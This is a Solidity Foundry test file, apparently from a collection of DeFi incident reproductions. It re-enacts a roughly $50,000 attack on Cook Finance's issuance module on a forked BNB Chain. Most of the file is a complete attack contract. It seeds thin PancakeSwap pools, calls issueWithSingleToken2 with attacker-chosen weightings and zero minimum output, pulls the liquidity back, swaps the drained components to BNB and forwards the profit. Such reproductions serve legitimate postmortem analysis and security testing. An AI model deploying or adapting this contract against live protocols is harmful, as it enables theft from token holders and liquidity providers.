// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~$50,000 USD
// Attacker : 0xee18c4c2e123402731f43d680e75ca2809c30f8b
// Attack Contract : 0xeffcb496cae89e7e92abe17d22386345707ceee4
// Vulnerable Contract : 0x7db3cbaf736c049933a3af28dbed4a4442aa89d0
// Victim CKToken in this tx : 0xa4e9f6032ee717710d8fd3dce0367d283e16f50e
// Attack Tx : https://bscscan.com/tx/0x51e46828b7aabfa810910b3f8ca535053716e6bcb8b7f94a4ff59757d71a1bca
//
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x7db3cbaf736c049933a3af28dbed4a4442aa89d0#code
//
// @Analysis
// Twitter Guy : https://x.com/DefimonAlerts/status/2071497001443770684
//
// Attack summary: the attacker seeded thin Pancake component pools, called Cook Finance
// issueWithSingleToken2 twice with caller-chosen component weightings, removed the seeded LP, and
// sold the recovered CKToken components for BNB.
// Root cause: issueWithSingleToken2 used attacker-supplied weightings to trade CKToken holdings
// through a Pancake V2 spot-price adapter with zero minimum output, so thin-pool manipulation turned
// a one-unit issue request into real CKToken component outflows.

address constant ATTACKER = 0xEe18c4c2E123402731f43d680e75ca2809c30f8b;
address constant HISTORICAL_ATTACK_CONTRACT = 0xeFFcB496CaE89E7E92abe17d22386345707CEEe4;
address constant ISSUANCE_MODULE = 0x7Db3CBAf736C049933A3Af28dBeD4A4442aa89d0;
address constant CK_TOKEN = 0xA4e9f6032ee717710D8Fd3dCE0367d283e16f50e;
address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant PANCAKE_FACTORY = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
address constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

uint256 constant INITIAL_BNB = 0.02 ether;
uint256 constant LARGE_SEED_BNB = 0.001 ether;
uint256 constant SMALL_SEED_BNB = 0.0001 ether;
uint256 constant PRECISE_UNIT = 1 ether;
uint256 constant ISSUE_QUANTITY = 1;
uint256 constant SMALL_COMPONENT_WEIGHT = 1_000_000 ether;
uint256 constant TARGET_BALANCE_NUMERATOR = 999;
uint256 constant TARGET_BALANCE_DENOMINATOR = 1000;

interface ICKTokenCook {
    function getComponents() external view returns (address[] memory);
    function balanceOf(
        address owner
    ) external view returns (uint256);
}

interface IIssuanceModuleV2 {
    function issueWithSingleToken2(
        address ckToken,
        address issueToken,
        uint256 issueTokenQuantity,
        uint256 minCkTokenRec,
        address[] calldata midTokens,
        uint256[] calldata weightings,
        address to,
        bool returnDust
    ) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 106_740_999;
        vm.createSelectFork("bsc", forkBlock);

        fundingToken = address(0);
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(HISTORICAL_ATTACK_CONTRACT, "Historical attack contract");
        vm.label(ISSUANCE_MODULE, "Cook IssuanceModuleV2");
        vm.label(CK_TOKEN, "Cook CKToken");
        vm.label(PANCAKE_ROUTER, "Pancake router");
        vm.label(PANCAKE_FACTORY, "Pancake factory");
        vm.label(WBNB_TOKEN, "WBNB");

        address[] memory components = ICKTokenCook(CK_TOKEN).getComponents();
        for (uint256 i = 0; i < components.length; i++) {
            vm.label(components[i], string(abi.encodePacked("CK component ", vm.toString(i))));
        }
    }

    function testExploit() public balanceLog {
        address[] memory components = ICKTokenCook(CK_TOKEN).getComponents();
        uint256 ckCakeBefore = IERC20(components[0]).balanceOf(CK_TOKEN);
        uint256 ckVbnbBefore = IERC20(components[1]).balanceOf(CK_TOKEN);

        vm.deal(ATTACKER, INITIAL_BNB);

        vm.startPrank(ATTACKER);
        CookFinanceIssuanceAttack attack = new CookFinanceIssuanceAttack{value: INITIAL_BNB}(ATTACKER);
        attack.execute();
        vm.stopPrank();

        uint256 attackerProfit = ATTACKER.balance - INITIAL_BNB;
        assertGt(attackerProfit, 2.7 ether);
        assertLt(IERC20(components[0]).balanceOf(CK_TOKEN), ckCakeBefore);
        assertLt(IERC20(components[1]).balanceOf(CK_TOKEN), ckVbnbBefore);
    }
}

contract CookFinanceIssuanceAttack {
    address private immutable profitReceiver;

    constructor(
        address receiver
    ) payable {
        profitReceiver = receiver;
    }

    function execute() external {
        address[] memory components = ICKTokenCook(CK_TOKEN).getComponents();
        require(components.length == 8, "unexpected component count");

        approveComponents(components);

        // step 1: seed CAKE/component pools and make the module sell the CKToken's CAKE balance.
        seedFirstIssueCycle(components);
        issueWithManipulatedWeight(components, 0);
        removeSeededLiquidity(components, 0);

        // step 2: seed vBNB/component pools and repeat against the CKToken's vBNB balance.
        seedSecondIssueCycle(components);
        issueWithManipulatedWeight(components, 1);
        removeSeededLiquidity(components, 1);

        // step 3: convert recovered components to BNB and forward the native profit.
        swapComponentsToBnb(components);
        payable(profitReceiver).transfer(address(this).balance);
    }

    function seedFirstIssueCycle(
        address[] memory components
    ) private {
        buyWithBnb(components[0], LARGE_SEED_BNB);
        buyWithBnb(components[0], SMALL_SEED_BNB);
        buyWithBnb(components[1], SMALL_SEED_BNB);
        addThinLiquidity(components[0], components[1]);

        for (uint256 i = 2; i < components.length; i++) {
            buyWithBnb(components[i], SMALL_SEED_BNB);
            addThinLiquidity(components[0], components[i]);
        }
    }

    function seedSecondIssueCycle(
        address[] memory components
    ) private {
        buyWithBnb(components[1], LARGE_SEED_BNB);
        buyWithBnb(components[0], SMALL_SEED_BNB);
        addThinLiquidity(components[1], components[0]);

        for (uint256 i = 2; i < components.length; i++) {
            buyWithBnb(components[1], SMALL_SEED_BNB);
            buyWithBnb(components[i], SMALL_SEED_BNB);
            addThinLiquidity(components[1], components[i]);
        }
    }

    function issueWithManipulatedWeight(
        address[] memory components,
        uint256 issueIndex
    ) private {
        address issueToken = components[issueIndex];
        address[] memory midTokens = new address[](components.length);
        uint256[] memory weightings = new uint256[](components.length);

        for (uint256 i = 0; i < components.length; i++) {
            weightings[i] = SMALL_COMPONENT_WEIGHT;
        }

        uint256 ckIssueTokenBalance = IERC20(issueToken).balanceOf(CK_TOKEN);
        uint256 targetSellAmount = (ckIssueTokenBalance * TARGET_BALANCE_NUMERATOR) / TARGET_BALANCE_DENOMINATOR;
        weightings[issueIndex] = targetSellAmount * PRECISE_UNIT;

        IERC20(issueToken).approve(ISSUANCE_MODULE, ISSUE_QUANTITY);
        IIssuanceModuleV2(ISSUANCE_MODULE)
            .issueWithSingleToken2(CK_TOKEN, issueToken, ISSUE_QUANTITY, 0, midTokens, weightings, address(this), true);
    }

    function addThinLiquidity(
        address baseToken,
        address component
    ) private {
        uint256 baseAmount = IERC20(baseToken).balanceOf(address(this)) / 10;
        uint256 componentAmount = IERC20(component).balanceOf(address(this));

        if (baseAmount == 0 || componentAmount == 0) return;

        IPancakeRouter(payable(PANCAKE_ROUTER))
            .addLiquidity(
                baseToken, component, baseAmount, componentAmount, 0, 0, address(this), block.timestamp + 1 hours
            );

        address pair = IUniswapV2Factory(PANCAKE_FACTORY).getPair(baseToken, component);
        IERC20(pair).approve(PANCAKE_ROUTER, type(uint256).max);
    }

    function removeSeededLiquidity(
        address[] memory components,
        uint256 baseIndex
    ) private {
        address baseToken = components[baseIndex];

        for (uint256 i = 0; i < components.length; i++) {
            if (i == baseIndex) continue;

            address pair = IUniswapV2Factory(PANCAKE_FACTORY).getPair(baseToken, components[i]);
            uint256 liquidity = IERC20(pair).balanceOf(address(this));
            if (liquidity == 0) continue;

            IPancakeRouter(payable(PANCAKE_ROUTER))
                .removeLiquidity(baseToken, components[i], liquidity, 0, 0, address(this), block.timestamp + 1 hours);
        }
    }

    function swapComponentsToBnb(
        address[] memory components
    ) private {
        for (uint256 i = 0; i < components.length; i++) {
            uint256 balance = IERC20(components[i]).balanceOf(address(this));
            if (balance == 0) continue;

            address[] memory path = new address[](2);
            path[0] = components[i];
            path[1] = WBNB_TOKEN;

            IPancakeRouter(payable(PANCAKE_ROUTER))
                .swapExactTokensForETH(balance, 0, path, address(this), block.timestamp + 1 hours);
        }
    }

    function buyWithBnb(
        address token,
        uint256 amount
    ) private {
        address[] memory path = new address[](2);
        path[0] = WBNB_TOKEN;
        path[1] = token;

        IPancakeRouter(payable(PANCAKE_ROUTER)).swapExactETHForTokens{value: amount}(
            0, path, address(this), block.timestamp + 1 hours
        );
    }

    function approveComponents(
        address[] memory components
    ) private {
        for (uint256 i = 0; i < components.length; i++) {
            IERC20(components[i]).approve(PANCAKE_ROUTER, type(uint256).max);
        }
    }

    receive() external payable {}
}
